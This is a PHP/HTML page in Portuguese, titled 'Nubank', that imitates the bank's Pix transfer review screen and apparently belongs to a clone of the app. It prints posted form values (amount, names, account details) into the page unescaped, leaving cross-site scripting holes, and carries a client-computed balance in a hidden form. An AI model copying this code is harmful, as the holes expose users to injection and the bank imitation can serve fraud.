<?php
session_start();
include 'conexaoatualizada.php'; // Inclua o arquivo de conexão

if (!isset($_SESSION['id'])) {
    header("refresh:0;url=login.php");
    exit;
}
include 'transferencias.php';
?>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  
<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">

  <style type="text/css">
  .botaoentrar {
	font-size: 18px;
	background-color: #820AD1;
	width: 90%; /* Ajuste a largura conforme necessário */
	height: 44px; /* Ajuste a altura conforme necessário */
	color: #FFF;
	border-radius: 45px;
	font-style: normal;
	line-height: normal;
	background-position: center center;
	font-weight: normal;
	margin: 0px;
	border: 10px double #820AD1;
	text-align: center;
	font-family: "Graphik Medium";
}

    body {
	text-align: center;
	margin: 0;
	padding: 0;
	background-color: #FFF;
    }
.texto1 {
	font-size: 16px;
	color: #666;
	font-weight: normal;
    line-height: 1;
}

    img {
      max-width: 100%;
      height: auto;
    }
  .fundoimagem tr td table tr td {
	background-image: url(03.png);
}
  .txt {
	font-size: 14px;
}
  .fundo {
	background-image: url(imagens/inicial.PNG);
	background-repeat: no-repeat;
	background-position: center top;
	background-size: 100%;
	
}
  .topo {
	background-color: #771AC9;
}
  .topotexto {
	font-size: 20px;
	color: #FFF;
}
  .bases {
}
.image-container {
  overflow-x: auto;
  white-space: nowrap;
}

.image-container img {
  display: inline-block;
  margin-right: 10px; /* Adicione um espaçamento entre as imagens */
}
  .fatura {
	font-size: 18px;
	color: #666;
}
.fatura2 {
	font-size: 18px;
	color: #333;
}
  .limite {
	font-size: 13px;
	color: #797979;
}
  .linha {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
#divFixa {
	position: fixed;
	bottom: 2px; /* Ajuste o valor do espaçamento conforme necessário */
	width: 285px;
	left: 50%;
	transform: translateX(-50%);
	background-color: rgba(0, 0, 0, 0.0);
	opacity: 0.96;}

  .valortransf {
	font-size: 36px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	color: #000;
	font-weight: bold;
}
  .linha1 {
	width: 100%;
	height: 1px;
	background-color: #EBEBEB;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
  .valorx {
	outline: none;
	font-size: 20px;
	color: #000;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-weight: normal;
}
  .linha {
	background-image: url(imagens/linha.png);
	background-repeat: no-repeat;
	background-position: center bottom;
	width: 100%;
}
  .informacao {	font-family: Arial, Helvetica, sans-serif;
	font-size: 15px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
}
  </style>
</head>
<body>
<table width="350" border="0" align="center">
  <tr>
    <td height="50" align="center"><table width="350" border="0">
      <tr>
        <td><a href="areapix.php"><img src="imagens/setay.png" alt="" width="31"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="100%" border="0">
  <tr>
    
  </tr>
</table>
<table width="350" border="0" align="center">
  <tr>
    <td>
<form name="form1" method="post" action="senhatransf.php">
<table width="350" border="0" align="center">
      <tr>
        <td height="40" colspan="2" align="left"><span class="icon2" style="font-size: 27px; color: #333;letter-spacing: -0.5px;"">Transferindo<b>
            <?php
$valor = $_POST['valor'];
// Agora você pode usar a variável $valor para realizar qualquer processamento necessário
?>
          </b></span></td>
      </tr>
      <tr>
        <td height="60" colspan="2" align="left" valign="bottom"><span class="icon2" style="font-size: 44px; color: #8E33CC;letter-spacing: -1px;">R$ <?php echo $valor; ?></span> <a href="javascript:history.back()"><img src="imagens/editar.png" width="25"></a></span></td>
      </tr>
      <tr>
        <td height="30" colspan="2" align="left" valign="middle"><span class="icon3">para </span><span class="icon3" style="letter-spacing: -0.4px;"><b><?php echo $_POST['dnome']; ?></b></span></td>
      </tr>
      <tr>
        <td height="80" colspan="2" align="center" valign="middle"><img src="imagens/mensagem.png" width="237"></td>
      </tr>
      <?php
	  $cpfx = $_POST["dcpf"];

if (strlen($cpfx) == 11) {
    // É um CPF
    $parte1 = substr($cpfx, 0, 3);
    $parte2 = substr($cpfx, 3, 3);
    $parte3 = substr($cpfx, 6, 3);
    $parte4 = substr($cpfx, 9, 2);

    $cpf_formatado = $parte1 . '.' . $parte2 . '.' . $parte3 . '-' . $parte4;

    echo '<tr>
        <td height="40" align="left" valign="middle" ><span class="icon1" style="font-size: 16px; color: #666; font-family: "Graphik Regular";">CPF</span></td>
        <td align="right" valign="middle" class="icon3">•••' . substr($cpf_formatado, 3, -2) . '••</td>
      </tr>';
} elseif (strlen($cpfx) == 14) {
    ?>
    
    <tr>
        <td height="40" align="left" valign="middle" ><span class="icon3" style="font-size: 16px; color: #666;">CNPJ</span></td>
        <td align="right" valign="middle" class="icon3"><?php
$cpfx = $_POST["dcpf"];
$cpfx = preg_replace("/[^0-9]/", "", $cpfx);

if (strlen($cpfx) == 11) {
    // É um CPF
    $parte1 = substr($cpfx, 0, 3);
    $parte2 = substr($cpfx, 3, 3);
    $parte3 = substr($cpfx, 6, 3);
    $parte4 = substr($cpfx, 9, 2);

    $cpf_formatado = $parte1 . '.' . $parte2 . '.' . $parte3 . '-' . $parte4;
    
    echo 'CPF formatado: ' . $cpf_formatado;
} elseif (strlen($cpfx) == 14) {
    // É um CNPJ
    $parte1 = substr($cpfx, 0, 2);
    $parte2 = substr($cpfx, 2, 3);
    $parte3 = substr($cpfx, 5, 3);
    $parte4 = substr($cpfx, 8, 4);
    $parte5 = substr($cpfx, 12, 2);

    $cnpj_formatado = $parte1 . '.' . $parte2 . '.' . $parte3 . '/' . $parte4 . '-' . $parte5;
    
    echo $cnpj_formatado;
} else {
    echo 'Entrada inválida';
}
?>
</td>
      </tr>
    
    <?php
} else {
    // Não é nem CPF nem CNPJ
    echo "Informação inválida.";
}

	  ?>
      <tr>
        <td height="40" align="left" valign="middle"><span class="icon3" style="font-size: 16px; color: #666;">Instituição</span></td>
        <td align="right" valign="middle" class="icon3"><?php echo $_POST['dinstitu']; ?></td>
        </tr>
      <?php
if (isset($_POST['dagencia']) && strpos($_POST['dagencia'], 'agencia') !== false) {
    echo '<tr>';
    echo '    <td height="40" align="left" valign="middle"><span class="icon3" style="font-size: 16px; color: #666;">Agencia</span></td>';
    echo '    <td align="right" valign="middle" class="icon3">' . $_POST['dagencia'] . '</td>';
    echo '</tr>';
}
?>
      <?php
if (isset($_POST['dconta']) && strpos($_POST['dconta'], 'agencia') !== false) {
    echo '<tr>';
    echo '    <td height="40" align="left" valign="middle"><span class="icon3" style="font-size: 16px; color: #666;">Conta corrente</span></td>';
    echo '    <td align="right" valign="middle" class="icon3">' . $_POST['dconta'] . '</td>';
    echo '</tr>';
}
?>

      <?php
if (!empty($_POST['dagencia'])) {
?>
<tr>
    <td height="40" align="left" valign="middle"><span class="icon3" style="font-size: 16px; color: #666;">Agencia</span></td>
    <td align="right" valign="middle" class="icon3"><?php echo $_POST['dagencia']; ?></td>
</tr>
<?php
}
?>
<?php
if (!empty($_POST['dconta'])) {
?>
      <tr>
        <td height="40" align="left" valign="middle"><span class="icon3" style="font-size: 16px; color: #666;">Conta Corrente</span></td>
        <td align="right" valign="middle" class="icon3"><?php echo $_POST['dconta']; ?></td>
      </tr>
<?php
}
?>      <tr>
        <td height="40" colspan="2" align="left" valign="middle">&nbsp;</td>
        </tr>
      <tr>
        <td height="120" colspan="2" align="center" valign="bottom"><input name="button" type="submit" class="botaoentrar" id="button" value="Revisar transferencia">
          <br>
          <div hidden="">          <p>
            <input name="chave" type="text" class="informacao" id="chave" value="<?php echo $_POST["chave"];?>">
            <br>
            <input name="data"type="text" class="informacao" id="data" value="<?php echo $_POST["data"]; ?>">
            <br>
            <input name="hora"type="text" class="informacao" id="hora" value="<?php echo $_POST["hora"]; ?>">
            <br>
            <input name="valor"type="text" class="informacao" id="valor" value="<?php echo $_POST["valor2"]; ?>">
            <br>
            <input name="dnome"type="text" class="informacao" id="dnome" value="<?php echo $_POST["dnome"]; ?>">
            <br>
            <input name="dcpf"type="text" class="informacao" id="dcpf" value="<?php echo $_POST["dcpf"]; ?>">
            <br>
            <input name="dinstitu"type="text" class="informacao" id="dinstitu" value="<?php echo $_POST["dinstitu"]; ?>">
            <br>
            <input name="dagencia"type="text" class="informacao" id="dagencia" value="<?php echo $_POST["dagencia"]; ?>">
            <br>
            <input name="dconta"type="text" class="informacao" id="valor6" value="<?php echo $_POST["dconta"]; ?>">
            <br>
            <input name="dtconta"type="text" class="informacao" id="valor6" value="<?php echo $_POST["dtconta"]; ?>">
            <br>
            <input name="onome"type="text" class="informacao" id="onome" value="<?php echo $_POST["onome"]; ?>">
            <br>
            <input name="oinstitu"type="text" class="informacao" id="oinstitu" value="<?php echo $_POST["oinstitu"]; ?>">
            <br>
            <input name="oagencia"type="text" class="informacao" id="oagencia" value="<?php echo $_POST["oagencia"]; ?>">
            <br>
            <input name="oconta"type="text" class="informacao" id="valor7" value="<?php echo $_POST["oconta"]; ?>">
            <br>
            <input name="ocpf"type="text" class="informacao" id="valor8" value="<?php echo $_POST["ocpf"]; ?>">
            <br>
            <?php 
			$a1 = $_POST["valor1"];
			$a2 = $_POST["valor2"];
			$transferencia = $a1 - $a2;
			?>
            <input name="saldonovo"type="text" class="informacao" id="valor3" value="<?php echo $transferencia; ?>">
            <br>
            </p>
            </div></td>
      </tr>
  </table>
</form>
</td>
  </tr>
</table>
</body>
</html>
